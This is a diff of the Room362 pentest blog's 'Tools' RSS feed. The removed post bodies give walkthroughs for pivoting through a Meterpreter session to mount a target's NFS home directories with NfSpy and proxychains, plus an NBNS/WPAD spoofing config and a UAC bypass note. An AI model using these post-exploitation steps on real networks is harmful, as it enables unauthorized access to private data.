@@ -1,13 +1,16 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes" ?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>Room362</title>
-    <link>https://room362.com/categories/tools/index.xml</link>
-    <description>Recent content on Room362</description>
+    <title>Tools on Room362</title>
+    <link>https://room362.com/categories/tools/</link>
+    <description>Recent content in Tools on Room362</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <copyright>&amp;copy; 2016. All rights reserved.</copyright>
-    <atom:link href="https://room362.com/categories/tools/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Mon, 04 Mar 2013 21:20:19 +0000</lastBuildDate>
+    
+	<atom:link href="https://room362.com/categories/tools/index.xml" rel="self" type="application/rss+xml" />
+    
     
     <item>
       <title>Mounting NFS shares through Meterpreter with NfSpy</title>
@@ -15,162 +18,7 @@
       <pubDate>Mon, 04 Mar 2013 21:20:19 +0000</pubDate>
       
       <guid>https://room362.com/post/2013/2013-03-04-mounting-nfs-shares-through-meterpreter-with-nfspy/</guid>
-      <description>&lt;p&gt;You&amp;rsquo;ve found an NFS share on a pentest, it&amp;rsquo;s sharing out your target&amp;rsquo;s home directories (/home) and some SAN with all of the Windows AD users &amp;ldquo;home&amp;rdquo; directories under /volumes/users/. You only have a meterpreter session though&amp;hellip; enough back story, problem is that Metasploit doesn&amp;rsquo;t really have any auxiliary modules or otherwise to access the things on those shares. Please correct me if I&amp;rsquo;m wrong, but there also aren&amp;rsquo;t any tools for talking to NFS shares over TCP only proxies.&lt;/p&gt;
-
-&lt;p&gt;Enter NfSpy: &lt;a href=&#34;https://github.com/bonsaiviking/NfSpy&#34;&gt;https://github.com/bonsaiviking/NfSpy&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;While it&amp;rsquo;s original intent was aide in bypassing NFS security controls it has the right amount of options to make mounting NFS over Meterpreter possible.&lt;/p&gt;
-
-&lt;p&gt;First we setup up our route so that the aux module will go over the meterpreter session:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;route add 192.168.1.0 255.255.255.0 1
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;The 1 on the end being the meterpreter session number it&amp;rsquo;s going to be going through. Next up is to find out what exports are available:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;msf &amp;gt; use auxiliary/scanner/nfs/nfsmount
-msf auxiliary(nfsmount) &amp;gt; show options
-
-Module options (auxiliary/scanner/nfs/nfsmount):
-
-   Name     Current Setting  Required  Description
-   ----     ---------------  --------  -----------
-   RHOSTS                    yes       The target address range or CIDR identifier
-   RPORT    111              yes       The target port
-   THREADS  1                yes       The number of concurrent threads&amp;lt;
-
-msf auxiliary(nfsmount) &amp;gt; set RHOSTS 192.168.1.50
-RHOSTS =&amp;gt; 192.168.1.50
-msf auxiliary(nfsmount) &amp;gt; run
-[+] 192.168.1.50 NFS Export: /home [192.168.1.0/24]
-[+] 192.168.1.50 NFS Export: /volume/users [192.168.1.0/24]
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Looks like access is restricked by IP range, but luckily the victim is in said range. The final piece of information we need is the TCP port(s) that mountd is listening on. There is a metasploit module that can help use there too:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;msf &amp;gt; use auxiliary/scanner/misc/sunrpc_portmapper
-msf auxiliary(sunrpc_portmapper) &amp;gt; show options
-
-Module options (auxiliary/scanner/misc/sunrpc_portmapper):
-
-   Name     Current Setting  Required  Description&amp;lt;
-   ----     ---------------  --------  -----------
-   RHOSTS                    yes       The target address range or CIDR identifier
-   RPORT    111              yes       The target port
-   THREADS  1                yes       The number of concurrent threads
-
-msf auxiliary(sunrpc_portmapper) &amp;gt; set RHOSTS 192.168.1.50
-RHOSTS =&amp;gt; 192.168.1.50
-msf auxiliary(sunrpc_portmapper) &amp;gt; run
-
-[+] 192.168.1.50 - Programs available
-        rpcbind - 111/tcp
-        rpcbind - 111/udp
-        status - 46797/udp
-        status - 55731/tcp
-        nfs - 2049/tcp
-        nfs_acl - 2049/tcp
-        nfs - 2049/udp
-        nfs_acl - 2049/udp
-        nlockmgr - 54167/udp
-        nlockmgr - 38216/tcp
-        mountd - 52569/udp&amp;lt;
-        mountd - 37719/tcp
-        mountd - 39099/udp
-        mountd - 55763/tcp
-        mountd - 37808/udp
-        mountd - 54457/tcp
-[*] Scanned 1 of 1 hosts (100% complete)
-[*] Auxiliary module execution completed
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Cool, so lets target /home first with the mountd tcp port of 37719. Keeping our route where it is we set up Metasploit&amp;rsquo;s socks proxy:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;msf &amp;gt; use auxiliary/server/socks4a
-msf auxiliary(socks4a) &amp;gt; show options
-
-Module options (auxiliary/server/socks4a):
-  Name     Current Setting  Required  Description
-  ----     ---------------  --------  -----------
-  SRVHOST  0.0.0.0          yes       The address to listen on
-  SRVPORT  1080             yes       The port to listen on.
-
-msf auxiliary(socks4a) &amp;gt; set SRVPORT 9050
-SRVPORT =&amp;gt; 9050
-msf auxiliary(socks4a) &amp;gt; set SRVHOST 127.0.0.1
-SRVHOST =&amp;gt; 127.0.0.1
-msf auxiliary(socks4a) &amp;gt; run
-[*] Auxiliary module execution completed
-[*] Starting the socks4a proxy server
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;I chose 9050 as my SRVPORT since I have proxychains already set up for that port (ala tor) and I highly recommend setting the SRVHOST to 127.0.0.1, unless you either firewall that port off from the Internet or don&amp;rsquo;t mind having the Anons of the world surf through your meterpreter session into your clients.&lt;/p&gt;
-
-&lt;p&gt;Next up it actually using nfspy (create or prep a directory so you can mount it first):&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;proxychains nfspy -d -o server=192.168.1.50:/home,nfsport=2049/tcp,mountport=37719/tcp,rw /root/nfspy/mount
-ProxyChains-3.1 (http://proxychains.sf.net)
-FUSE library version: 2.8.6
-nullpath_ok: 0
-unique: 1, opcode: INIT (26), nodeid: 0, insize: 56
-INIT: 7.16
-flags=0x0000007b
-max_readahead=0x00020000
-|S-chain|-&amp;lt;&amp;gt;-127.0.0.1:9050-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-192.168.1.50:37719-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
-|S-chain|-&amp;lt;&amp;gt;-127.0.0.1:9050-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-192.168.1.50:2049-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
-  INIT: 7.12
-  flags=0x00000011
-  max_readahead=0x00020000
-  max_write=0x00020000
-  unique: 1, success, outsize: 40
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&lt;code&gt;proxychains nfspy -d -o server=192.168.1.50:/home,nfsport=2049/tcp,mountport=37719/tcp,rw /root/nfspy/mount&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Lets break that command down. Proxychains will wrap nfspy so that it goes through our Metasploit Socks4a proxy. The -d tells NfSpy to stay in the foreground, and -o for options. Server is our target IP, only use a hostname if your attacker box can resolve it to the right IP. The export we found with the Metasploit module is up next, and the default NFS port of 2049. The mountport option is from the port mapper Metasploit module. Both of these port options be sure you specify the /tcp or you&amp;rsquo;ll just be waiting as there isn&amp;rsquo;t really a time out and Proxychains doesn&amp;rsquo;t show UDP attempts. RW for read-write and finally the location to mount to.&lt;/p&gt;
-
-&lt;p&gt;If you see that second proxychains request for port 2049 it is usually a good indicator that it worked, if not you have probably run into anything from a permissions issue to a local mount problem. NfSpy uses fuse which can be really silent when problems arrise or give errors that tell you nothing meaningful. Thats why I&amp;rsquo;m using the -d option that keeps nfspy in the foreground, just so I can detect any issues. Lets see if that worked:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;ls /root/nfspy/mount
-user1
-user2
-user3
-user4
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Remember, big directories might take a while to navigate being tunneled like this. Here is the output from the ls on the nfspy side:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;unique: 166, opcode: OPENDIR (27), nodeid: 34, insize: 48
-   unique: 166, success, outsize: 32
-unique: 167, opcode: READDIR (28), nodeid: 34, insize: 80
-readdir[0] from 0
-   unique: 167, success, outsize: 208
-unique: 168, opcode: LOOKUP (1), nodeid: 34, insize: 46
-LOOKUP /home/user3
-getattr /home/user3
-   NODEID: 40
-   unique: 168, success, outsize: 144
-unique: 169, opcode: LOOKUP (1), nodeid: 34, insize: 46
-LOOKUP /home/user1
-getattr /home/user1
-   NODEID: 41
-   unique: 169, success, outsize: 144
-unique: 170, opcode: LOOKUP (1), nodeid: 34, insize: 46
-LOOKUP /home/user4
-getattr /home/user4
-   NODEID: 42
-   unique: 170, success, outsize: 144
-unique: 171, opcode: LOOKUP (1), nodeid: 34, insize: 46
-LOOKUP /home/user2
-getattr /home/user2
-   NODEID: 43
-   unique: 171, success, outsize: 144
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Thats it. You can mount read-write (rw) or read-only (ro) depending on what you want to do and how quiet you want to be.&lt;/p&gt;
-
-&lt;p&gt;Last note, you can&amp;rsquo;t just CTRL-C an nfspy mount, you need to use &lt;code&gt;fusermount -u /root/nfspy/mount&lt;/code&gt; to kill it. It&amp;rsquo;s another fuse issue. If anyone has a better way to do this I&amp;rsquo;m all ears.&lt;/p&gt;
-</description>
+      <description>You&amp;rsquo;ve found an NFS share on a pentest, it&amp;rsquo;s sharing out your target&amp;rsquo;s home directories (/home) and some SAN with all of the Windows AD users &amp;ldquo;home&amp;rdquo; directories under /volumes/users/. You only have a meterpreter session though&amp;hellip; enough back story, problem is that Metasploit doesn&amp;rsquo;t really have any auxiliary modules or otherwise to access the things on those shares. Please correct me if I&amp;rsquo;m wrong, but there also aren&amp;rsquo;t any tools for talking to NFS shares over TCP only proxies.</description>
     </item>
     
     <item>
@@ -179,23 +27,8 @@ getattr /home/user2
       <pubDate>Fri, 22 Feb 2013 20:36:02 +0000</pubDate>
       
       <guid>https://room362.com/post/2013/2013-02-22-compile-nfsshell-on-ubuntu/</guid>
-      <description>&lt;p&gt;This is here because I always forget how to do it&lt;/p&gt;
-
-&lt;ol&gt;
-&lt;li&gt;&lt;code&gt;sudo apt-get install libtirpc-dev libncurses-dev&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;wget http://www.cs.vu.nl/pub/leendert/nfsshell.tar.gz&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;tar zxvf nfsshell.tar.gz&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;cd nfs&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;ln -s /usr/include/tirpc/rpc/clnt_soc.h /usr/include/rpc/clnt_soc.h&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;perl -p -i.orig -e &#39;s/getline/getline_nfs/&#39; nfs.c&lt;/code&gt;&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;Next part I don&amp;rsquo;t have a good way to automate. You need to go in and comment out (w/ #) the 4 lines following &amp;ldquo;uncomment the following 4 lines for Solaris 2.x&amp;rdquo; and uncomment the 2 lines following &amp;ldquo;For GNU readline support you need to add&amp;rdquo;&lt;/p&gt;
-
-&lt;p&gt;After that a simple &amp;ldquo;make&amp;rdquo; should get you ./nfs sitting there for your use.&lt;/p&gt;
-
-&lt;p&gt;Will probably make a repo out of this so I don&amp;rsquo;t have to keep doing it..&lt;/p&gt;
-</description>
+      <description>This is here because I always forget how to do it
+ sudo apt-get install libtirpc-dev libncurses-dev wget http://www.cs.vu.nl/pub/leendert/nfsshell.tar.gz tar zxvf nfsshell.tar.gz cd nfs ln -s /usr/include/tirpc/rpc/clnt_soc.h /usr/include/rpc/clnt_soc.h perl -p -i.orig -e &#39;s/getline/getline_nfs/&#39; nfs.c  Next part I don&amp;rsquo;t have a good way to automate. You need to go in and comment out (w/ #) the 4 lines following &amp;ldquo;uncomment the following 4 lines for Solaris 2.x&amp;rdquo; and uncomment the 2 lines following &amp;ldquo;For GNU readline support you need to add&amp;rdquo;</description>
     </item>
     
     <item>
@@ -204,26 +37,10 @@ getattr /home/user2
       <pubDate>Tue, 16 Oct 2012 03:15:19 +0000</pubDate>
       
       <guid>https://room362.com/post/2012/2012-10-16-uac-alwaysnotify-bypass-ish/</guid>
-      <description>&lt;p&gt;&lt;strong&gt;UPDATE: THIS IS ONLY WORKS WITH THE LOCAL ADMIN (ID 500) ACCOUNT AND PASSWORD&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;(MY MISTAKE FOR NOT TESTING MORE)&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;So the &amp;ldquo;-ish&amp;rdquo; is you need to have the username and pass of &lt;del&gt;another account that has administrator rights&lt;/del&gt; the local administrator account on that box. But other than that, the following image should speak for itself. (no UAC prompt occurred during the following actions)&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://room362.com/images/postimages/201210_uacish_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;I plan on writing a Metasploit module to do this as all it really does is starts a process as a different user and that process executes ShellExecute&amp;rsquo;s &amp;lsquo;RunAs&amp;rsquo; verb. But until then, get CPAU here:&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;http://www.joeware.net/freetools/tools/cpau/&#34;&gt;http://www.joeware.net/freetools/tools/cpau/&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;and Elevate here: &lt;a href=&#34;http://jpassing.com/2007/12/08/launch-elevated-processes-from-the-command-line/&#34;&gt;http://jpassing.com/2007/12/08/launch-elevated-processes-from-the-command-line/&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;and doing it manually with built in Windows Kung-Fu:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://room362.com/images/postimages/201210_uacish_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt; &lt;/p&gt;
-</description>
+      <description>UPDATE: THIS IS ONLY WORKS WITH THE LOCAL ADMIN (ID 500) ACCOUNT AND PASSWORD
+(MY MISTAKE FOR NOT TESTING MORE)
+So the &amp;ldquo;-ish&amp;rdquo; is you need to have the username and pass of another account that has administrator rights the local administrator account on that box. But other than that, the following image should speak for itself. (no UAC prompt occurred during the following actions)
+I plan on writing a Metasploit module to do this as all it really does is starts a process as a different user and that process executes ShellExecute&amp;rsquo;s &amp;lsquo;RunAs&amp;rsquo; verb.</description>
     </item>
     
     <item>
@@ -232,36 +49,11 @@ getattr /home/user2
       <pubDate>Mon, 08 Oct 2012 04:36:00 +0000</pubDate>
       
       <guid>https://room362.com/post/2012/2012-10-08-compiling-and-release-of-ditto/</guid>
-      <description>&lt;p&gt;If you follow the exact same steps you did for Netview: &lt;a href=&#34;https://room362.com/blog/2012/10/07/compiling-and-release-of-netview/&#34;&gt;/blog/2012/10/07/compiling-and-release-of-netview/&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;then you already have the steps needed to create a compiled version of ditto from the repo here:&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://github.com/mubix/ditto&#34;&gt;https://github.com/mubix/ditto&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;And while the sheep icon is cute, and a nod to what ditto does, it comes at a pretty hefty cost:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://room362.com/images/postimages/201210_ditto_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Size. Now if you&amp;rsquo;re scoffing at 408 KB then you don&amp;rsquo;t have any issues, but I like not having to wait while a binary I am trying to push to a victim box is transferring. Removing the icon is pretty straight forward. Once you&amp;rsquo;ve loaded the .SLN file up in Visual Studio C++ just expand the &amp;ldquo;Resource Files&amp;rdquo; folder in the &amp;ldquo;Solution Explorer&amp;rdquo;:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://room362.com/images/postimages/201210_ditto_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;And summarily delete both files (Right click and go to Remove or just press the Del button)&lt;/p&gt;
-
-&lt;p&gt;(Side note, don&amp;rsquo;t forget to rename or copy the one with the icon somewhere first if you want to keep that version)&lt;/p&gt;
-
-&lt;p&gt;Then &amp;ldquo;Build Solution&amp;rdquo; again, and wa-la! A much smaller, less witty but highly functional Ditto:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://room362.com/images/postimages/201210_ditto_3.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;And of course, like last time, you could go through all that, or just download them here:&lt;/p&gt;
-
-&lt;p&gt;Without the icon: &lt;a href=&#34;https://room362.com/projects/ditto_noicon.exe&#34;&gt;/projects/ditto_noicon.exe&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;With the icon: &lt;a href=&#34;https://room362.com/projects/ditto_withicon.exe&#34;&gt;/projects/ditto_withicon.exe&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt; &lt;/p&gt;
-</description>
+      <description>If you follow the exact same steps you did for Netview: /blog/2012/10/07/compiling-and-release-of-netview/
+then you already have the steps needed to create a compiled version of ditto from the repo here:
+https://github.com/mubix/ditto
+And while the sheep icon is cute, and a nod to what ditto does, it comes at a pretty hefty cost:
+Size. Now if you&amp;rsquo;re scoffing at 408 KB then you don&amp;rsquo;t have any issues, but I like not having to wait while a binary I am trying to push to a victim box is transferring.</description>
     </item>
     
     <item>
@@ -270,40 +62,8 @@ getattr /home/user2
       <pubDate>Sun, 07 Oct 2012 04:10:51 +0000</pubDate>
       
       <guid>https://room362.com/post/2012/2012-10-07-compiling-and-release-of-netview/</guid>
-      <description>&lt;p&gt;If you haven&amp;rsquo;t caught &lt;a href=&#34;http://carnal0wnage.attackresearch.com/&#34;&gt;Chris Gates&lt;/a&gt; (&lt;a href=&#34;https://twitter.com/carnal0wnage&#34;&gt;@carnal0wnage&lt;/a&gt;) and my &lt;a href=&#34;http://www.irongeek.com/i.php?page=videos/derbycon2/1-1-6-rob-fuller-chris-gates-dirty-little-secrets-part-2&#34;&gt;talk&lt;/a&gt; at &lt;a href=&#34;http://www.derbycon.com/&#34;&gt;DerbyCon 2012&lt;/a&gt; - we released 2 tools, &lt;a href=&#34;https://github.com/mubix/netview&#34;&gt;Netview&lt;/a&gt;, and &lt;a href=&#34;https://github.com/mubix/ditto&#34;&gt;Ditto&lt;/a&gt;. Here I&amp;rsquo;ll walk you through compiling Netview yourself, in the next blog post we&amp;rsquo;ll go over compiling Ditto and how you can remove it&amp;rsquo;s icon to reduce the size if you want. But for Netview it&amp;rsquo;s pretty straight forward. First you pull a copy of the GIT repository:&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://github.com/mubix/netview&#34;&gt;https://github.com/mubix/netview&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Once you&amp;rsquo;ve done that, you&amp;rsquo;ve got a directory looking like this:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://room362.com/images/postimages/201210_netview_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;You will also need Visual Studio C++ (The Express version if free here: &lt;a href=&#34;http://www.microsoft.com/visualstudio/eng/downloads#d-2010-express&#34;&gt;http://www.microsoft.com/visualstudio/eng/downloads#d-2010-express&lt;/a&gt; )&lt;/p&gt;
-
-&lt;p&gt;Once you have both you double click the .sln file (Solution File)&lt;/p&gt;
-
-&lt;p&gt;And you get a ugly blue and purple box like this:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://room362.com/images/postimages/201210_netview_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Where you switch the compile option from &amp;ldquo;Debug&amp;rdquo; to &amp;ldquo;Release&amp;rdquo; and click to &amp;ldquo;Build Solution&amp;rdquo;:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://room362.com/images/postimages/201210_netview_3.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Sounds much more grandiose than it really is. If all goes well you&amp;rsquo;ll get the box at the bottom to say &amp;ldquo;Build: 1 succeeded&amp;rdquo;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://room362.com/images/postimages/201210_netview_4.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;You&amp;rsquo;ll have a new folder:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://room362.com/images/postimages/201210_netview_5.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;and inside is your wonderful prize:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://room362.com/images/postimages/201210_netview_6.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;You could go through all of that… or just download it here: &lt;a href=&#34;https://room362.com/projects/netview.exe&#34;&gt;/projects/netview.exe&lt;/a&gt;&lt;/p&gt;
-</description>
+      <description>If you haven&amp;rsquo;t caught Chris Gates (@carnal0wnage) and my talk at DerbyCon 2012 - we released 2 tools, Netview, and Ditto. Here I&amp;rsquo;ll walk you through compiling Netview yourself, in the next blog post we&amp;rsquo;ll go over compiling Ditto and how you can remove it&amp;rsquo;s icon to reduce the size if you want. But for Netview it&amp;rsquo;s pretty straight forward. First you pull a copy of the GIT repository:
+https://github.com/mubix/netview</description>
     </item>
     
     <item>
@@ -312,68 +72,8 @@ getattr /home/user2
       <pubDate>Sat, 06 Oct 2012 03:02:45 +0000</pubDate>
       
       <guid>https://room362.com/post/2012/2012-10-06-lab-setup-windows-proxy-and-egress-filtering/</guid>
-      <description>&lt;p&gt;&lt;a href=&#34;http://www.pfsense.org&#34;&gt;pfSense&lt;/a&gt; is an excellent free way of including a firewall / ids / proxy in your lab or VMs. It runs small and fast, but even as simple as pfsense is sometimes you need a bit less complexity and speed of configuration.&lt;/p&gt;
-
-&lt;p&gt;Enter Peerblock and AnalogX&amp;rsquo;s proxy. Two free tools, one usually used to stop people who torrent from getting caught by the RIAA/MPAA and the other a drop dead simple windows based proxy utility.&lt;/p&gt;
-
-&lt;p&gt;First we&amp;rsquo;ll talk about AnalogX&amp;rsquo;s proxy, you can get it here: &lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;http://www.analogx.com/contents/download/Network/proxy/Freeware.htm&#34;&gt;http://www.analogx.com/contents/download/Network/proxy/Freeware.htm&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;http://www.analogx.com/contents/download/Network/proxy/Freeware.htm&#34;&gt;&lt;img src=&#34;https://room362.com/images/postimages/201210_egress_1.png&#34; alt=&#34;&#34; /&gt;&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;A simple next-&amp;gt;next-&amp;gt;finish install gets you this:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://room362.com/images/postimages/201210_egress_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;With the following ports listening:&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;HTTP (web browsers) (port 6588)&lt;/li&gt;
-&lt;li&gt;HTTPS (secure web browsers) (port 6588)&lt;/li&gt;
-&lt;li&gt;SOCKS4 (TCP proxying) (port 1080)&lt;/li&gt;
-&lt;li&gt;SOCKS4a (TCP proxying w/ DNS lookups) (port 1080)&lt;/li&gt;
-&lt;li&gt;SOCKS5 (only partial support, no UDP) (port 1080)&lt;/li&gt;
-&lt;li&gt;NNTP (usenet newsgroups) (port 119)&lt;/li&gt;
-&lt;li&gt;POP3 (receiving email) (port 110)&lt;/li&gt;
-&lt;li&gt;SMTP (sending email) (port 25)&lt;/li&gt;
-&lt;li&gt;FTP (file transfers) (port 21)&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;So you can test everything to your hearts content that it goes through a proxy, using any proxy type you want basically.&lt;/p&gt;
-
-&lt;p&gt;(I will assume here that you know how to setup your own proxy settings for your OS)&lt;/p&gt;
-
-&lt;p&gt;But the problem being that if your code / application misbehaves it will still get out. You could go to the trouble of fiddling with the Windows firewall if you are running Windows 7 (not sure if XP can box egress, probably can). But I like simple and straight forward solutions.&lt;/p&gt;
-
-&lt;p&gt;PeerBlock can be found here: &lt;a href=&#34;http://www.peerblock.com/releases&#34;&gt;http://www.peerblock.com&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;http://www.peerblock.com/releases&#34;&gt;&lt;img src=&#34;https://room362.com/images/postimages/201210_egress_3.png&#34; alt=&#34;&#34; /&gt;&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;And is simple to set up as well (next-&amp;gt;next-&amp;gt;finish applies).&lt;/p&gt;
-
-&lt;p&gt;Go into List Manager once you have it installed and &amp;ldquo;Create a List&amp;rdquo;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://room362.com/images/postimages/201210_egress_4.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Give it a description and a place to save the file:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://room362.com/images/postimages/201210_egress_5.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;You&amp;rsquo;ll get this window automatically pop up, but if you don&amp;rsquo;t you just click &amp;lsquo;Add&amp;rsquo; with your custom list selected in the List Manager:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://room362.com/images/postimages/201210_egress_6.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Feel free to block everything but one IP, a range, or whatever your meets your needs, nothing in or out from or to that IP/Range will be allowed&lt;/p&gt;
-
-&lt;p&gt;One of the uses I use it for is blocking the whole Internet except for my internal ranges for stuff like my personal Virus Total lab where I run bins to test stuff out, that way the AntiVirus services can&amp;rsquo;t ship my bin off to who knows where to be analyzed before I even get to use it.&lt;/p&gt;
-
-&lt;p&gt;Here is an example of my &amp;ldquo;All the Internet&amp;rdquo; block list:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://room362.com/images/postimages/201210_egress_7.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Thats everything for now, hope some of it was useful in your setup and experiments ;-)&lt;/p&gt;
-</description>
+      <description>pfSense is an excellent free way of including a firewall / ids / proxy in your lab or VMs. It runs small and fast, but even as simple as pfsense is sometimes you need a bit less complexity and speed of configuration.
+Enter Peerblock and AnalogX&amp;rsquo;s proxy. Two free tools, one usually used to stop people who torrent from getting caught by the RIAA/MPAA and the other a drop dead simple windows based proxy utility.</description>
     </item>
     
     <item>
@@ -382,21 +82,9 @@ getattr /home/user2
       <pubDate>Sun, 02 Sep 2012 05:39:31 +0000</pubDate>
       
       <guid>https://room362.com/post/2012/2012-09-02-old-school-on-target-nbns-spoofing-part-2/</guid>
-      <description>&lt;p&gt;So it turns out that Windows Firewall talks IP addresses just like any other firewall, so if you configure FakeNetBIOSNS to tell everyone that the IP address for whatever they looked up is YOUR IP, guess what, no need to bypass the spoof filters ;-) Happy Rob!&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;$ cat nbns.ini   
-PROJECTMENTOR WPAD 172.16.10.207  
-PROJECTMENTOR FILESHARE 173.26.10.207
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://room362.com/images/postimages/201209_nbns_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Results in:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://room362.com/images/postimages/201209_nbns_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Game ON!&lt;/p&gt;
-</description>
+      <description>So it turns out that Windows Firewall talks IP addresses just like any other firewall, so if you configure FakeNetBIOSNS to tell everyone that the IP address for whatever they looked up is YOUR IP, guess what, no need to bypass the spoof filters ;-) Happy Rob!
+$ cat nbns.ini PROJECTMENTOR WPAD 172.16.10.207 PROJECTMENTOR FILESHARE 173.26.10.207  Results in:
+Game ON!</description>
     </item>
     
     <item>
@@ -405,56 +93,9 @@ PROJECTMENTOR FILESHARE 173.26.10.207
       <pubDate>Sat, 01 Sep 2012 05:16:14 +0000</pubDate>
       
       <guid>https://room362.com/post/2012/2012-09-01-old-school-on-target-nbns-spoofing/</guid>
-      <description>&lt;p&gt;One of pen testers favorite attacks is NBNS spoofing. Now Wesley who I originally learned this attack from, traced this back to sid (&lt;a href=&#34;http://www.notsosecure.com/folder2/2007/03/14/abusing-tcpip-name-resolution-in-windows-to-carry-out-phishing-attacks/&#34;&gt;http://www.notsosecure.com/folder2/2007/03/14/abusing-tcpip-name-resolution-in-windows-to-carry-out-phishing-attacks/&lt;/a&gt;) . Wesley&amp;rsquo;s stuff can be found here: &lt;a href=&#34;http://www.mcgrewsecurity.com/tools/nbnspoof/&#34;&gt;http://www.mcgrewsecurity.com/tools/nbnspoof/&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Wesley&amp;rsquo;s stuff eventually lead to this awesome post on the Packetstan blog: &lt;a href=&#34;http://www.packetstan.com/2011/03/nbns-spoofing-on-your-way-to-world.html&#34;&gt;http://www.packetstan.com/2011/03/nbns-spoofing-on-your-way-to-world.html&lt;/a&gt;&lt;/p&gt;
-
